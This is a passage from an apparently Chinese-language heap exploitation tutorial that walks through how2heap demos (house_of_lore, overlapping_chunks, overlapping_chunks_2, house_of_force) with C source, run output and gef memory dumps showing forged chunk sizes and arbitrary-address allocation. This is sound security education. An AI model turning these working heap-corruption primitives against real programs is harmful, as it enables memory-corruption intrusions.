intptr_t sc = (intptr_t)jackpot;\n    memcpy((p4+0xa8), &amp;sc, 8);\n}\n$ gcc -g house_of_lore.c\n$ ./a.out\nAllocated the victim (small) chunk: 0x55674d75f260\nstack_buffer_1: 0x7ffff71fb1d0\nstack_buffer_2: 0x7ffff71fb1f0\n\nFreeing the victim chunk 0x55674d75f260, it will be inserted in the unsorted bin\nvictim-&gt;fd: 0x7f1eba392b00\nvictim-&gt;bk: 0x7f1eba392b00\n\nMalloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x55674d75f700\nThe victim chunk 0x55674d75f260 will be inserted in front of the SmallBin\nvictim-&gt;fd: 0x7f1eba392b80\nvictim-&gt;bk: 0x7f1eba392b80\n\nNow emulating a vulnerability that can overwrite the victim-&gt;bk pointer\nThis last malloc should return a chunk at the position injected in bin-&gt;bk: 0x7ffff71fb1e0\nThe fd pointer of stack_buffer_2 has changed: 0x7ffff71fb1e0\n\nNice jump d00d\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#overlapping_chunks","title":"overlapping_chunks","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n\nint main() {\n    intptr_t *p1,*p2,*p3,*p4;\n\n    p1 = malloc(0x90 - 8);\n    p2 = malloc(0x90 - 8);\n    p3 = malloc(0x80 - 8);\n    memset(p1, 'A', 0x90 - 8);\n    memset(p2, 'A', 0x90 - 8);\n    memset(p3, 'A', 0x80 - 8);\n    fprintf(stderr, \"Now we allocate 3 chunks on the heap\\n\");\n    fprintf(stderr, \"p1=%p\\np2=%p\\np3=%p\\n\\n\", p1, p2, p3);\n\n    free(p2);\n    fprintf(stderr, \"Freeing the chunk p2\\n\");\n\n    int evil_chunk_size = 0x111;\n    int evil_region_size = 0x110 - 8;\n    *(p2-1) = evil_chunk_size; // Overwriting the \"size\" field of chunk p2\n    fprintf(stderr, \"Emulating an overflow that can overwrite the size of the chunk p2.\\n\\n\");\n\n    p4 = malloc(evil_region_size);\n    fprintf(stderr, \"p4: %p ~ %p\\n\", p4, p4+evil_region_size);\n    fprintf(stderr, \"p3: %p ~ %p\\n\", p3, p3+0x80);\n\n    fprintf(stderr, \"\\nIf we memset(p4, 'B', 0xd0), we have:\\n\");\n    memset(p4, 'B', 0xd0);\n    fprintf(stderr, \"p4 = %s\\n\", (char *)p4);\n    fprintf(stderr, \"p3 = %s\\n\", (char *)p3);\n\n    fprintf(stderr, \"\\nIf we memset(p3, 'C', 0x50), we have:\\n\");\n    memset(p3, 'C', 0x50);\n    fprintf(stderr, \"p4 = %s\\n\", (char *)p4);\n    fprintf(stderr, \"p3 = %s\\n\", (char *)p3);\n}\n$ gcc -g overlapping_chunks.c\n$ ./a.out\nNow we allocate 3 chunks on the heap\np1=0x1e2b010\np2=0x1e2b0a0\np3=0x1e2b130\n\nFreeing the chunk p2\nEmulating an overflow that can overwrite the size of the chunk p2.\n\np4: 0x1e2b0a0 ~ 0x1e2b8e0\np3: 0x1e2b130 ~ 0x1e2b530\n\nIf we memset(p4, 'B', 0xd0), we have:\np4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa\np3 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa\n\nIf we memset(p3, 'C', 0x50), we have:\np4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa\np3 = CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa\n</code></pre> <p>\u8fd9\u4e2a\u6bd4\u8f83\u7b80\u5355\uff0c\u5c31\u662f\u5806\u5757\u91cd\u53e0\u7684\u95ee\u9898\u3002\u901a\u8fc7\u4e00\u4e2a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u6539\u5199 unsorted bin \u4e2d\u7a7a\u95f2\u5806\u5757\u7684 size\uff0c\u6539\u53d8\u4e0b\u4e00\u6b21 malloc \u53ef\u4ee5\u8fd4\u56de\u7684\u5806\u5757\u5927\u5c0f\u3002</p> <p>\u9996\u5148\u5206\u914d\u4e09\u4e2a\u5806\u5757\uff0c\u7136\u540e\u91ca\u653e\u6389\u4e2d\u95f4\u7684\u4e00\u4e2a\uff1a</p> <pre><code>gef\u27a4  x/60gx 0x602010-0x10\n0x602000:    0x0000000000000000    0x0000000000000091  &lt;-- chunk 1\n0x602010:    0x4141414141414141    0x4141414141414141\n0x602020:    0x4141414141414141    0x4141414141414141\n0x602030:    0x4141414141414141    0x4141414141414141\n0x602040:    0x4141414141414141    0x4141414141414141\n0x602050:    0x4141414141414141    0x4141414141414141\n0x602060:    0x4141414141414141    0x4141414141414141\n0x602070:    0x4141414141414141    0x4141414141414141\n0x602080:    0x4141414141414141    0x4141414141414141\n0x602090:    0x4141414141414141    0x0000000000000091  &lt;-- chunk 2 [be freed]\n0x6020a0:    0x00007ffff7dd1b78    0x00007ffff7dd1b78\n0x6020b0:    0x4141414141414141    0x4141414141414141\n0x6020c0:    0x4141414141414141    0x4141414141414141\n0x6020d0:    0x4141414141414141    0x4141414141414141\n0x6020e0:    0x4141414141414141    0x4141414141414141\n0x6020f0:    0x4141414141414141    0x4141414141414141\n0x602100:    0x4141414141414141    0x4141414141414141\n0x602110:    0x4141414141414141    0x4141414141414141\n0x602120:    0x0000000000000090    0x0000000000000080  &lt;-- chunk 3\n0x602130:    0x4141414141414141    0x4141414141414141\n0x602140:    0x4141414141414141    0x4141414141414141\n0x602150:    0x4141414141414141    0x4141414141414141\n0x602160:    0x4141414141414141    0x4141414141414141\n0x602170:    0x4141414141414141    0x4141414141414141\n0x602180:    0x4141414141414141    0x4141414141414141\n0x602190:    0x4141414141414141    0x4141414141414141\n0x6021a0:    0x4141414141414141    0x0000000000020e61  &lt;-- top chunk\n0x6021b0:    0x0000000000000000    0x0000000000000000\n0x6021c0:    0x0000000000000000    0x0000000000000000\n0x6021d0:    0x0000000000000000    0x0000000000000000\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena 'main_arena' ]\n[+] unsorted_bins[0]: fw=0x602090, bk=0x602090\n \u2192   Chunk(addr=0x6020a0, size=0x90, flags=PREV_INUSE)\n</code></pre> <p>chunk 2 \u88ab\u653e\u5230\u4e86 unsorted bin \u4e2d\uff0c\u5176 size \u503c\u4e3a 0x90\u3002</p> <p>\u63a5\u4e0b\u6765\uff0c\u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u6539\u5199 chunk 2 \u7684 size \u503c\uff0c\u6bd4\u5982\u8fd9\u91cc\u6211\u4eec\u5c06\u5176\u6539\u4e3a 0x111\uff0c\u4e5f\u5c31\u662f\u539f\u672c chunk 2 \u548c chunk 3 \u7684\u5927\u5c0f\u76f8\u52a0\uff0c\u6700\u540e\u4e00\u4f4d\u662f 1 \u8868\u793a chunk 1 \u662f\u5728\u4f7f\u7528\u7684\uff0c\u5176\u5b9e\u6709\u6ca1\u6709\u90fd\u65e0\u6240\u8c13\u3002</p> <pre><code>gef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena 'main_arena' ]\n[+] unsorted_bins[0]: fw=0x602090, bk=0x602090\n \u2192   Chunk(addr=0x6020a0, size=0x110, flags=PREV_INUSE)\n</code></pre> <p>\u8fd9\u65f6 unsorted bin \u4e2d\u7684\u6570\u636e\u4e5f\u66f4\u6539\u4e86\u3002</p> <p>\u63a5\u4e0b\u6765 malloc \u4e00\u4e2a\u5927\u5c0f\u7684\u7b49\u4e8e chunk 2 \u548c chunk 3 \u4e4b\u548c\u7684 chunk 4\uff0c\u8fd9\u4f1a\u5c06 chunk 2 \u548c chunk 3 \u90fd\u5305\u542b\u8fdb\u6765\uff1a</p> <pre><code>gef\u27a4  x/60gx 0x602010-0x10\n0x602000:    0x0000000000000000    0x0000000000000091  &lt;-- chunk 1\n0x602010:    0x4141414141414141    0x4141414141414141\n0x602020:    0x4141414141414141    0x4141414141414141\n0x602030:    0x4141414141414141    0x4141414141414141\n0x602040:    0x4141414141414141    0x4141414141414141\n0x602050:    0x4141414141414141    0x4141414141414141\n0x602060:    0x4141414141414141    0x4141414141414141\n0x602070:    0x4141414141414141    0x4141414141414141\n0x602080:    0x4141414141414141    0x4141414141414141\n0x602090:    0x4141414141414141    0x0000000000000111  &lt;-- chunk 4\n0x6020a0:    0x00007ffff7dd1b78    0x00007ffff7dd1b78\n0x6020b0:    0x4141414141414141    0x4141414141414141\n0x6020c0:    0x4141414141414141    0x4141414141414141\n0x6020d0:    0x4141414141414141    0x4141414141414141\n0x6020e0:    0x4141414141414141    0x4141414141414141\n0x6020f0:    0x4141414141414141    0x4141414141414141\n0x602100:    0x4141414141414141    0x4141414141414141\n0x602110:    0x4141414141414141    0x4141414141414141\n0x602120:    0x0000000000000090    0x0000000000000080  &lt;-- chunk 3\n0x602130:    0x4141414141414141    0x4141414141414141\n0x602140:    0x4141414141414141    0x4141414141414141\n0x602150:    0x4141414141414141    0x4141414141414141\n0x602160:    0x4141414141414141    0x4141414141414141\n0x602170:    0x4141414141414141    0x4141414141414141\n0x602180:    0x4141414141414141    0x4141414141414141\n0x602190:    0x4141414141414141    0x4141414141414141\n0x6021a0:    0x4141414141414141    0x0000000000020e61  &lt;-- top chunk\n0x6021b0:    0x0000000000000000    0x0000000000000000\n0x6021c0:    0x0000000000000000    0x0000000000000000\n0x6021d0:    0x0000000000000000    0x0000000000000000\n</code></pre> <p>\u8fd9\u6837\uff0c\u76f8\u5f53\u4e8e chunk 4 \u548c chunk 3 \u5c31\u91cd\u53e0\u4e86\uff0c\u4e24\u4e2a chunk \u53ef\u4ee5\u4e92\u76f8\u4fee\u6539\u5bf9\u65b9\u7684\u6570\u636e\u3002\u5c31\u50cf\u4e0a\u9762\u7684\u8fd0\u884c\u7ed3\u679c\u6253\u5370\u51fa\u6765\u7684\u90a3\u6837\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#overlapping_chunks_2","title":"overlapping_chunks_2","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;malloc.h&gt;\n\nint main() {\n    intptr_t *p1,*p2,*p3,*p4,*p5,*p6;\n    unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;\n    int prev_in_use = 0x1;\n\n    p1 = malloc(0x10);\n    p2 = malloc(0x80);\n    p3 = malloc(0x80);\n    p4 = malloc(0x80);\n    p5 = malloc(0x10);\n    real_size_p1 = malloc_usable_size(p1);\n    real_size_p2 = malloc_usable_size(p2);\n    real_size_p3 = malloc_usable_size(p3);\n    real_size_p4 = malloc_usable_size(p4);\n    real_size_p5 = malloc_usable_size(p5);\n    memset(p1, 'A', real_size_p1);\n    memset(p2, 'A', real_size_p2);\n    memset(p3, 'A', real_size_p3);\n    memset(p4, 'A', real_size_p4);\n    memset(p5, 'A', real_size_p5);\n    fprintf(stderr, \"Now we allocate 5 chunks on the heap\\n\\n\");\n    fprintf(stderr, \"chunk p1: %p ~ %p\\n\", p1, (unsigned char *)p1+malloc_usable_size(p1));\n    fprintf(stderr, \"chunk p2: %p ~ %p\\n\", p2, (unsigned char *)p2+malloc_usable_size(p2));\n    fprintf(stderr, \"chunk p3: %p ~ %p\\n\", p3, (unsigned char *)p3+malloc_usable_size(p3));\n    fprintf(stderr, \"chunk p4: %p ~ %p\\n\", p4, (unsigned char *)p4+malloc_usable_size(p4));\n    fprintf(stderr, \"chunk p5: %p ~ %p\\n\", p5, (unsigned char *)p5+malloc_usable_size(p5));\n\n    free(p4);\n    fprintf(stderr, \"\\nLet's free the chunk p4\\n\\n\");\n\n    fprintf(stderr, \"Emulating an overflow that can overwrite the size of chunk p2 with (size of chunk_p2 + size of chunk_p3)\\n\\n\");\n    *(unsigned int *)((unsigned char *)p1 + real_size_p1) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; // BUG HERE\n\n    free(p2);\n\n    p6 = malloc(0x1b0 - 0x10);\n    real_size_p6 = malloc_usable_size(p6);\n    fprintf(stderr, \"Allocating a new chunk 6: %p ~ %p\\n\\n\", p6, (unsigned char *)p6+real_size_p6);\n\n    fprintf(stderr, \"Now p6 and p3 are overlapping, if we memset(p6, 'B', 0xd0)\\n\");\n    fprintf(stderr, \"p3 before = %s\\n\", (char *)p3);\n    memset(p6, 'B', 0xd0);\n    fprintf(stderr, \"p3 after  = %s\\n\", (char *)p3);\n}\n$ gcc -g overlapping_chunks_2.c\n$ ./a.out\nNow we allocate 5 chunks on the heap\n\nchunk p1: 0x18c2010 ~ 0x18c2028\nchunk p2: 0x18c2030 ~ 0x18c20b8\nchunk p3: 0x18c20c0 ~ 0x18c2148\nchunk p4: 0x18c2150 ~ 0x18c21d8\nchunk p5: 0x18c21e0 ~ 0x18c21f8\n\nLet's free the chunk p4\n\nEmulating an overflow that can overwrite the size of chunk p2 with (size of chunk_p2 + size of chunk_p3)\n\nAllocating a new chunk 6: 0x18c2030 ~ 0x18c21d8\n\nNow p6 and p3 are overlapping, if we memset(p6, 'B', 0xd0)\np3 before = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ufffd\np3 after  = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ufffd\n</code></pre> <p>\u540c\u6837\u662f\u5806\u5757\u91cd\u53e0\u7684\u95ee\u9898\uff0c\u524d\u9762\u90a3\u4e2a\u662f\u5728 chunk \u5df2\u7ecf\u88ab free\uff0c\u52a0\u5165\u5230\u4e86 unsorted bin \u4e4b\u540e\uff0c\u518d\u4fee\u6539\u5176 size \u503c\uff0c\u7136\u540e malloc \u4e00\u4e2a\u4e0d\u4e00\u6837\u7684 chunk \u51fa\u6765\uff0c\u800c\u8fd9\u91cc\u662f\u5728 free \u4e4b\u524d\u4fee\u6539 size \u503c\uff0c\u4f7f free \u9519\u8bef\u5730\u4fee\u6539\u4e86\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u503c\uff0c\u5bfc\u81f4\u4e2d\u95f4\u7684 chunk \u5f3a\u884c\u5408\u5e76\u3002\u53e6\u5916\u524d\u9762\u90a3\u4e2a\u91cd\u53e0\u662f\u76f8\u90bb\u5806\u5757\u4e4b\u95f4\u7684\uff0c\u800c\u8fd9\u91cc\u662f\u4e0d\u76f8\u90bb\u5806\u5757\u4e4b\u95f4\u7684\u3002</p> <p>\u6211\u4eec\u9700\u8981\u4e94\u4e2a\u5806\u5757\uff0c\u5047\u8bbe\u7b2c chunk 1 \u5b58\u5728\u6ea2\u51fa\uff0c\u53ef\u4ee5\u6539\u5199\u7b2c\u4e8c\u4e2a chunk 2 \u7684\u6570\u636e\uff0cchunk 5 \u7684\u4f5c\u7528\u662f\u9632\u6b62\u91ca\u653e chunk 4 \u540e\u88ab\u5408\u5e76\u8fdb top chunk\u3002\u6240\u4ee5\u6211\u4eec\u8981\u91cd\u53e0\u7684\u533a\u57df\u662f chunk 2 \u5230 chunk 4\u3002\u9996\u5148\u5c06 chunk 4 \u91ca\u653e\u6389\uff0c\u6ce8\u610f\u770b chunk 5 \u7684 prev_size \u503c\uff1a</p> <pre><code>gef\u27a4  x/70gx 0x602010-0x10\n0x602000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk 1\n0x602010:    0x4141414141414141    0x4141414141414141\n0x602020:    0x4141414141414141    0x0000000000000091  &lt;-- chunk 2\n0x602030:    0x4141414141414141    0x4141414141414141\n0x602040:    0x4141414141414141    0x4141414141414141\n0x602050:    0x4141414141414141    0x4141414141414141\n0x602060:    0x4141414141414141    0x4141414141414141\n0x602070:    0x4141414141414141    0x4141414141414141\n0x602080:    0x4141414141414141    0x4141414141414141\n0x602090:    0x4141414141414141    0x4141414141414141\n0x6020a0:    0x4141414141414141    0x4141414141414141\n0x6020b0:    0x4141414141414141    0x0000000000000091  &lt;-- chunk 3\n0x6020c0:    0x4141414141414141    0x4141414141414141\n0x6020d0:    0x4141414141414141    0x4141414141414141\n0x6020e0:    0x4141414141414141    0x4141414141414141\n0x6020f0:    0x4141414141414141    0x4141414141414141\n0x602100:    0x4141414141414141    0x4141414141414141\n0x602110:    0x4141414141414141    0x4141414141414141\n0x602120:    0x4141414141414141    0x4141414141414141\n0x602130:    0x4141414141414141    0x4141414141414141\n0x602140:    0x4141414141414141    0x0000000000000091  &lt;-- chunk 4 [be freed]\n0x602150:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer\n0x602160:    0x4141414141414141    0x4141414141414141\n0x602170:    0x4141414141414141    0x4141414141414141\n0x602180:    0x4141414141414141    0x4141414141414141\n0x602190:    0x4141414141414141    0x4141414141414141\n0x6021a0:    0x4141414141414141    0x4141414141414141\n0x6021b0:    0x4141414141414141    0x4141414141414141\n0x6021c0:    0x4141414141414141    0x4141414141414141\n0x6021d0:    0x0000000000000090    0x0000000000000020  &lt;-- chunk 5 &lt;-- prev_size\n0x6021e0:    0x4141414141414141    0x4141414141414141\n0x6021f0:    0x4141414141414141    0x0000000000020e11  &lt;-- top chunk\n0x602200:    0x0000000000000000    0x0000000000000000\n0x602210:    0x0000000000000000    0x0000000000000000\n0x602220:    0x0000000000000000    0x0000000000000000\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena 'main_arena' ]\n[+] unsorted_bins[0]: fw=0x602140, bk=0x602140\n \u2192   Chunk(addr=0x602150, size=0x90, flags=PREV_INUSE)\n</code></pre> <p>free chunk 4 \u88ab\u653e\u5165 unsorted bin\uff0c\u5927\u5c0f\u4e3a 0x90\u3002</p> <p>\u63a5\u4e0b\u6765\u662f\u6700\u5173\u952e\u7684\u4e00\u6b65\uff0c\u5229\u7528 chunk 1 \u7684\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u5c06 chunk 2 \u7684 size \u503c\u4fee\u6539\u4e3a chunk 2 \u548c chunk 3 \u7684\u5927\u5c0f\u4e4b\u548c\uff0c\u5373 0x90+0x90+0x1=0x121\uff0c\u6700\u540e\u7684 1 \u662f\u6807\u5fd7\u4f4d\u3002\u8fd9\u6837\u5f53\u6211\u4eec\u91ca\u653e chunk 2 \u7684\u65f6\u5019\uff0cmalloc \u6839\u636e\u8fd9\u4e2a\u88ab\u4fee\u6539\u7684 size \u503c\uff0c\u4f1a\u4ee5\u4e3a chunk 2 \u52a0\u4e0a chunk 3 \u7684\u533a\u57df\u90fd\u662f\u8981\u91ca\u653e\u7684\uff0c\u7136\u540e\u5c31\u9519\u8bef\u5730\u4fee\u6539\u4e86 chunk 5 \u7684 prev_size\u3002\u63a5\u7740\uff0c\u5b83\u53d1\u73b0\u7d27\u90bb\u7684\u4e00\u5757 chunk 4 \u4e5f\u662f free \u72b6\u6001\uff0c\u5c31\u628a\u5b83\u4fe9\u5408\u5e76\u5728\u4e86\u4e00\u8d77\uff0c\u7ec4\u6210\u4e00\u4e2a\u5927 free chunk\uff0c\u653e\u8fdb unsorted bin \u4e2d\u3002</p> <pre><code>gef\u27a4  x/70gx 0x602010-0x10\n0x602000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk 1\n0x602010:    0x4141414141414141    0x4141414141414141\n0x602020:    0x4141414141414141    0x00000000000001b1  &lt;-- chunk 2 [be freed] &lt;-- unsorted bin\n0x602030:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer\n0x602040:    0x4141414141414141    0x4141414141414141\n0x602050:    0x4141414141414141    0x4141414141414141\n0x602060:    0x4141414141414141    0x4141414141414141\n0x602070:    0x4141414141414141    0x4141414141414141\n0x602080:    0x4141414141414141    0x4141414141414141\n0x602090:    0x4141414141414141    0x4141414141414141\n0x6020a0:    0x4141414141414141    0x4141414141414141\n0x6020b0:    0x4141414141414141    0x0000000000000091  &lt;-- chunk 3\n0x6020c0:    0x4141414141414141    0x4141414141414141\n0x6020d0:    0x4141414141414141    0x4141414141414141\n0x6020e0:    0x4141414141414141    0x4141414141414141\n0x6020f0:    0x4141414141414141    0x4141414141414141\n0x602100:    0x4141414141414141    0x4141414141414141\n0x602110:    0x4141414141414141    0x4141414141414141\n0x602120:    0x4141414141414141    0x4141414141414141\n0x602130:    0x4141414141414141    0x4141414141414141\n0x602140:    0x4141414141414141    0x0000000000000091  &lt;-- chunk 4 [be freed]\n0x602150:    0x00007ffff7dd1b78    0x00007ffff7dd1b78\n0x602160:    0x4141414141414141    0x4141414141414141\n0x602170:    0x4141414141414141    0x4141414141414141\n0x602180:    0x4141414141414141    0x4141414141414141\n0x602190:    0x4141414141414141    0x4141414141414141\n0x6021a0:    0x4141414141414141    0x4141414141414141\n0x6021b0:    0x4141414141414141    0x4141414141414141\n0x6021c0:    0x4141414141414141    0x4141414141414141\n0x6021d0:    0x00000000000001b0    0x0000000000000020  &lt;-- chunk 5 &lt;-- prev_size\n0x6021e0:    0x4141414141414141    0x4141414141414141\n0x6021f0:    0x4141414141414141    0x0000000000020e11  &lt;-- top chunk\n0x602200:    0x0000000000000000    0x0000000000000000\n0x602210:    0x0000000000000000    0x0000000000000000\n0x602220:    0x0000000000000000    0x0000000000000000\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena 'main_arena' ]\n[+] unsorted_bins[0]: fw=0x602020, bk=0x602020\n \u2192   Chunk(addr=0x602030, size=0x1b0, flags=PREV_INUSE)\n</code></pre> <p>\u73b0\u5728 unsorted bin \u91cc\u7684 chunk \u7684\u5927\u5c0f\u4e3a 0x1b0\uff0c\u5373 0x90*3\u3002\u54a6\uff0c\u6240\u4ee5 chunk 3 \u867d\u7136\u662f\u4f7f\u7528\u72b6\u6001\uff0c\u4f46\u4e5f\u88ab\u5f3a\u884c\u7b97\u5728\u4e86 free chunk \u7684\u7a7a\u95f4\u91cc\u4e86\u3002</p> <p>\u6700\u540e\uff0c\u5982\u679c\u6211\u4eec\u5206\u914d\u4e00\u5757\u5927\u5c0f\u4e3a 0x1b0-0x10 \u7684\u5927\u7a7a\u95f4\uff0c\u8fd4\u56de\u7684\u5806\u5757\u5373\u662f\u5305\u62ec\u4e86 chunk 2 + chunk 3 + chunk 4 \u7684\u5927 chunk\u3002\u8fd9\u65f6 chunk 6 \u548c chunk 3 \u5c31\u91cd\u53e0\u4e86\uff0c\u7ed3\u679c\u5c31\u50cf\u4e0a\u9762\u8fd0\u884c\u65f6\u6253\u5370\u51fa\u6765\u7684\u4e00\u6837\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#318-linux","title":"3.1.8 Linux \u5806\u5229\u7528\uff08\u4e0b\uff09","text":"<ul> <li>how2heap</li> <li>house_of_force</li> <li>unsorted_bin_into_stack</li> <li>unsorted_bin_attack</li> <li>house_of_einherjar</li> <li>house_of_orange</li> <li>\u53c2\u8003\u8d44\u6599</li> </ul> <p>\u4e0b\u8f7d\u6587\u4ef6</p>"},{"location":"Training/Material/Binary%20Exploitation/#how2heap_2","title":"how2heap","text":""},{"location":"Training/Material/Binary%20Exploitation/#house_of_force","title":"house_of_force","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;malloc.h&gt;\n\nchar bss_var[] = \"This is a string that we want to overwrite.\";\n\nint main() {\n    fprintf(stderr, \"We will overwrite a variable at %p\\n\\n\", bss_var);\n\n    intptr_t *p1 = malloc(0x10);\n    int real_size = malloc_usable_size(p1);\n    memset(p1, 'A', real_size);\n    fprintf(stderr, \"Let's allocate the first chunk of 0x10 bytes: %p.\\n\", p1);\n    fprintf(stderr, \"Real size of our allocated chunk is 0x%x.\\n\\n\", real_size);\n\n    intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);\n    fprintf(stderr, \"Overwriting the top chunk size with a big value so the malloc will never call mmap.\\n\");\n    fprintf(stderr, \"Old size of top chunk: %#llx\\n\", *((unsigned long long int *)ptr_top));\n    ptr_top[0] = -1;\n    fprintf(stderr, \"New size of top chunk: %#llx\\n\", *((unsigned long long int *)ptr_top));\n\n    unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top;\n    fprintf(stderr, \"\\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size, we will malloc %#lx bytes.\\n\", bss_var, ptr_top, evil_size);\n    void *new_ptr = malloc(evil_size);\n    int real_size_new = malloc_usable_size(new_ptr);\n    memset((char *)new_ptr + real_size_new - 0x20, 'A', 0x20);\n    fprintf(stderr, \"As expected, the new pointer is at the same place as the old top chunk: %p\\n\", new_ptr);\n\n    void* ctr_chunk = malloc(0x30);\n    fprintf(stderr, \"malloc(0x30) =&gt; %p!\\n\", ctr_chunk);\n    fprintf(stderr, \"\\nNow, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.\\n\");\n\n    fprintf(stderr, \"old string: %s\\n\", bss_var);\n    strcpy(ctr_chunk, \"YEAH!!!\");\n    fprintf(stderr, \"new string: %s\\n\", bss_var);\n}\n$ gcc -g house_of_force.c\n$ ./a.out\nWe will overwrite a variable at 0x601080\n\nLet's allocate the first chunk of 0x10 bytes: 0x824010.\nReal size of our allocated chunk is 0x18.\n\nOverwriting the top chunk size with a big value so the malloc will never call mmap.\nOld size of top chunk: 0x20fe1\nNew size of top chunk: 0xffffffffffffffff\n\nThe value we want to write to at 0x601080, and the top chunk is at 0x824028, so accounting for the header size, we will malloc 0xffffffffffddd048 bytes.\nAs expected, the new pointer is at the same place as the old top chunk: 0x824030\nmalloc(0x30) =&gt; 0x601080!\n\nNow, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.\nold string: This is a string that we want to overwrite.\nnew string: YEAH!!!\n</code></pre> <p>house_of_force \u662f\u4e00\u79cd\u901a\u8fc7\u6539\u5199 top chunk \u7684 size \u5b57\u6bb5\u6765\u6b3a\u9a97 malloc \u8fd4\u56de\u4efb\u610f\u5730\u5740\u7684\u6280\u672f\u3002\u6211\u4eec\u77e5\u9053\u5728\u7a7a\u95f2\u5185\u5b58\u7684\u6700\u9ad8\u5904\uff0c\u5fc5\u7136\u5b58\u5728\u4e00\u5757\u7a7a\u95f2\u7684 chunk\uff0c\u5373 top chunk\uff0c\u5f53 bins \u548c fast bins \u90fd\u4e0d\u80fd\u6ee1\u8db3\u5206\u914d\u9700\u8981\u7684\u65f6\u5019\uff0cmalloc \u4f1a\u4ece top chunk \u4e2d\u5206\u51fa\u4e00\u5757\u5185\u5b58\u7ed9\u7528\u6237\u3002\u6240\u4ee5 top chunk \u7684\u5927\u5c0f\u4f1a\u968f\u7740\u5206\u914d\u548c\u56de\u6536\u4e0d\u505c\u5730\u53d8\u5316\u3002\u8fd9\u79cd\u653b\u51fb\u5047\u8bbe\u6709\u4e00\u4e2a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u6539\u5199 top chunk \u7684\u5934\u90e8\uff0c\u7136\u540e\u5c06\u5176\u6539\u4e3a\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u503c\uff0c\u4ee5\u786e\u4fdd\u6240\u6709\u7684 malloc \u5c06\u4f7f\u7528 top chunk \u5206\u914d\uff0c\u800c\u4e0d\u4f1a\u8c03\u7528 mmap\u3002\u8fd9\u65f6\u5982\u679c\u653b\u51fb\u8005 malloc \u4e00\u4e2a\u5f88\u5927\u7684\u6570\u76ee\uff08\u8d1f\u6709\u7b26\u53f7\u6574\u6570\uff09\uff0ctop chunk \u7684\u4f4d\u7f6e\u52a0\u4e0a\u8fd9\u4e2a\u5927\u6570\uff0c\u9020\u6210\u6574\u6570\u6ea2\u51fa\uff0c\u7ed3\u679c\u662f top chunk \u80fd\u591f\u88ab\u8f6c\u79fb\u5230\u5806\u4e4b\u524d\u7684\u5185\u5b58\u5730\u5740\uff08\u5982\u7a0b\u5e8f\u7684 .bss \u6bb5\u3001.data \u6bb5\u3001GOT \u8868\u7b49\uff09\uff0c\u4e0b\u6b21\u518d\u6267\u884c malloc 